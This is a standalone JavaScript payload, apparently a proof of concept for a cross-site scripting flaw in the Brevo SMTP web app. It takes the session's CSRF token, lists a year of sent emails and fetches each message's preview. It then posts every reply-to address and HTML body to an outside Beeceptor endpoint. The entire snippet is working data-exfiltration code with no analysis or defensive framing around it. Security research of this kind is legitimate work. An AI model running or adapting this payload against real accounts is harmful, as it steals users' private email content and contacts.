// Retrieving CSRF token from global variables
const csrfToken = window.SAILS_LOCALS ? window.SAILS_LOCALS._csrf : null;

// Check that the CSRF token is present
if (csrfToken) {
  $.ajax({
    url: 'https://app-smtp.brevo.com/statistics/get_reports_data',
    type: 'POST',
    contentType: 'application/json',
    data: JSON.stringify({
      from_date: "2024-01-01",
      to_date: "2025-01-01",
      limit: 1000,
      page: 0,
      _csrf: csrfToken
    }),
    success: function(response) {
      console.log('Response received:', response);

      // Filter data with 'sent' status and retrieve UUIDs
      const uuidsSent = (response.data || [])
        .filter(item => item.st === "sent")
        .map(item => item.uuid);

      console.log("UUIDs with 'sent' status:", uuidsSent);

      // For each UUID, perform a new request to get the details
      $.each(uuidsSent, function(index, uuid) {
        $.ajax({
          url: 'https://app-smtp.brevo.com/user/getpreview/',
          type: 'POST',
          contentType: 'application/json',
          data: JSON.stringify({
            uuid: uuid,
            _csrf: csrfToken
          }),
          success: function(detailResponse) {
            // Retrieving destination email and message
            const destinationEmail = detailResponse.replyTo.value[0].address;
            const message = detailResponse.html;

            console.log("Destination email for UUID " + uuid + ":", destinationEmail);
            console.log("Message for UUID " + uuid + ":", message);

            // Sending a POST request with email and message to Beeceptor
            $.ajax({
                url: 'https://bizibabe.free.beeceptor.com',
                type: 'POST',
                contentType: 'application/json',
                data: JSON.stringify({
                  email: destinationEmail,
                  message: message
                }),
                success: function() {
                  console.log("Data sent successfully to Beeceptor.");
                },
                error: function(xhr, status, error) {
                  console.error("Error when sending to Beeceptor:", xhr.status, error);
                }
              });
          },
          error: function(xhr, status, error) {
            console.error('Error during request for UUID ' + uuid + ':', xhr.status, error);
          }
        });
      });
    },
    error: function(xhr, status, error) {
      console.error('Error during initial request:', xhr.status, error);
    }
  });
} else {
  console.error("CSRF token not found.");
}